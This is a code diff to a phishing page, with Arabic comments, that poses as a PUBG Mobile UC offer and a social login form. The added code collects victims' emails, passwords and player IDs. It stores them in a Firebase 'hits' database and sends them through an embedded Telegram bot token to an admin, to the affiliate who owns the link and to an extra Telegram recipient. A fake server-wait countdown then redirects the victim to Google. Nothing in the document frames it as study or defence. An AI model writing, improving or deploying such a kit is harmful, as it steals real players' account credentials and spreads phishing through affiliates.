@@ -8,7 +8,6 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     
     <style>
-        /* دمج style.css + login.css + waiting.css */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         
         body {
@@ -40,14 +39,12 @@
             border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
-        /* التحكم في ظهور الأقسام */
         .section { display: none; }
         .active { display: block; }
 
         h2 { margin-bottom: 1.5rem; color: #ff9800; }
         p { margin-bottom: 1rem; font-size: 0.9rem; }
 
-        /* تنسيق الأزرار والحقول */
         .social-btn {
             display: flex;
             align-items: center;
@@ -83,7 +80,6 @@
             font-weight: bold;
         }
 
-        /* شريط التقدم */
         .progress-container {
             width: 100%;
             background: #444;
@@ -146,70 +142,120 @@
     </div>
 
     <script>
-        // --- الإعدادات (نفس الموجودة في script.js و login.js) ---
-        const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk";
-        const adminChatId = "5375214810";
+        // ✅ إعدادات Firebase
         const firebaseConfig = { databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/" };
-        
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // استخراج معرف المستخدم من الرابط
+        // ✅ إعدادات التليجرام
+        const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk";
+        const adminChatId = "5375214810";
+
+        // ✅ استخراج البيانات من الرابط
         function getUserId() {
             const params = new URLSearchParams(window.location.search);
-            return params.get("id") || "Unknown";
+            return params.get("user_id") || "Unknown";
         }
 
-        // --- الانتقالات ---
+        function getTelegramId() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get("telegram") || null;
+        }
+
+        // ✅ الانتقالات
         function showLogin(platform) {
             document.getElementById('index-section').classList.remove('active');
             document.getElementById('login-section').classList.add('active');
             document.getElementById('platform-text').innerText = "تسجيل الدخول عبر " + platform;
             
-            // إرسال إشعار أولي للتليجرام
-            sendToTelegram(`👤 زائر جديد ضغط على: ${platform}\n🆔 معرف المسوق: ${getUserId()}`);
+            sendToTelegram(`👤 زائر جديد ضغط على: ${platform}\n🆔 صاحب الرابط: ${getUserId()}`);
         }
 
-        function handleLogin() {
+        // ✅ دالة إرسال التليجرام
+        function sendToTelegram(text, chatId = adminChatId) {
+            if (!chatId || chatId === "Unknown" || chatId === "null") return;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
+            .catch(err => console.error("Telegram Error:", err));
+        }
+
+        // ✅ دالة حفظ البيانات - الأهم هنا!
+        async function saveDataToFirebase(data) {
+            const userId = getUserId();
+            if (userId === "Unknown") return;
+            
+            // ✅ حفظ في المسار الصحيح hits/userId
+            await db.ref('hits/' + userId).push({
+                tool: "pubg",
+                platform: data.platform,
+                user: data.email,
+                pass: data.password,
+                playerID: data.playerId,
+                uc: data.uc,
+                time: data.time,
+                timestamp: Date.now(),
+                status: "جديد ✅"
+            });
+        }
+
+        // ✅ دالة معالجة تسجيل الدخول
+        async function handleLogin() {
             const email = document.getElementById('email').value;
             const pass = document.getElementById('password').value;
             const pid = document.getElementById('player-id').value;
             const uc = document.getElementById('uc-amount').value;
             const error = document.getElementById('login-error');
+            const platform = document.getElementById('platform-text').innerText.replace('تسجيل الدخول عبر ', '');
+            const userId = getUserId();
+            const telegramId = getTelegramId();
 
             if (!email || !pass || !pid) {
                 error.innerText = "يرجى إدخال جميع البيانات!";
                 return;
             }
 
-            const userId = getUserId();
+            // ✅ تجهيز البيانات
             const logData = {
-                user: email,
-                pass: pass,
-                id: pid,
+                email: email,
+                password: pass,
+                playerId: pid,
                 uc: uc,
-                time: new Date().toLocaleString()
+                platform: platform,
+                time: new Date().toLocaleString('ar-EG')
             };
 
-            // حفظ في Firebase
-            db.ref('hits/' + userId + '/logs').push(logData);
+            // ✅ 1. حفظ في Firebase
+            await saveDataToFirebase(logData);
 
-            // إرسال للتليجرام
-            const message = `🔥 صيدة ببجي جديدة!\n📧 الحساب: ${email}\n🔑 الباسورد: ${pass}\n🆔 ID اللاعب: ${pid}\n💎 الكمية: ${uc}\n🔗 المسوق: ${userId}`;
-            sendToTelegram(message);
+            // ✅ 2. إرسال للتليجرام (للأدمن)
+            const message = `🔥 **صيدة ببجي جديدة!**\n\n` +
+                          `🎮 اللعبة: PUBG Mobile\n` +
+                          `🔗 صاحب الرابط: ${userId}\n` +
+                          `📧 الحساب: ${email}\n` +
+                          `🔑 الباسورد: ${pass}\n` +
+                          `🆔 ID اللاعب: ${pid}\n` +
+                          `💎 الكمية: ${uc} UC\n` +
+                          `🌐 المنصة: ${platform}\n` +
+                          `⏰ الوقت: ${logData.time}`;
+
+            // إرسال للأدمن
+            sendToTelegram(message, adminChatId);
             
-            // محاكاة إرسال للمسوق أيضاً إذا وجد ايدي خاص به
-            if(userId !== "Unknown") sendToTelegram(message, userId);
+            // ✅ 3. إرسال لصاحب الرابط
+            if (userId && userId !== "Unknown" && userId !== adminChatId) {
+                sendToTelegram(message, userId);
+            }
+            
+            // ✅ 4. إرسال للتليجرام ID المخصص
+            if (telegramId && telegramId !== "Unknown" && telegramId !== userId && telegramId !== adminChatId) {
+                sendToTelegram(message, telegramId);
+            }
 
-            // الانتقال لصفحة الانتظار
+            // ✅ 5. الانتقال لصفحة الانتظار
             startWaiting();
         }
 
-        function sendToTelegram(text, chatId = adminChatId) {
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
-            .catch(err => console.error("Telegram Error:", err));
-        }
-
+        // ✅ دالة العد التنازلي
         function startWaiting() {
             document.getElementById('login-section').classList.remove('active');
             document.getElementById('waiting-section').classList.add('active');
@@ -225,8 +271,7 @@
                 
                 if (time <= 0) {
                     clearInterval(interval);
-                    alert("عذراً، الضغط على السيرفر عالٍ جداً. حاول مرة أخرى لاحقاً.");
-                    window.location.reload();
+                    window.location.href = "https://www.google.com";
                 }
             }, 1000);
         }
